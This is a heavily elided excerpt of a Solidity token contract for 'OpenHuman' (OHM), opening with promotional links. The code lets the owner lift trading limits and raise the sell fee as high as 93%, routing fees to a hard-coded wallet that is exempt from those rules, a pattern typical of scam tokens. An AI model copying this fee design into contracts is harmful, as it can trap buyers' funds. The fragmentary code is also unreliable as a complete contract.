...
OpenHuman is an AI lab focused on building next-generation AI agents with human-like memory and 
an artificial subconscious—designed to think, remember, and assist just like a real companion.

Website  : https://tinyhumans.ai/openhuman
Telegram : https://t.me/openhumans
...
contract OHM is ERC20, Ownable {
    ...
    constructor() ERC20("OpenHuman", "OHM") {
        ...
        OHMAddress = address(0xA60A28B49A3dd2ea4C957838F15C855d8297102C);
        ...
        taxesSwap_setExcluded(OHMAddress, true);
        ...
        limitsAntiWhale_setExcluded(OHMAddress, true);
     ...
     */
    function wipeLimit() external onlyOwner {
        enableLimits = false;
        transferTaxTotal = 0;
    ...
    function taxesSwap_sell_set(uint256 _newSwapTax) external onlyOwner {
        ...
        require(
            sellFeeTotal <= 93,
            "Total sell fee cannot be higher than 93%"
        );
     ...
     * @return _OHMAddress The wallet that receives the marketing fees
     */
    function receiver_info()
        external
        view
        returns (address _OHMAddress)
    {
        return (OHMAddress);
    }
    ...
    function swapBack(uint256 amount) private {
        ...
        (success, ) = address(OHMAddress).call{
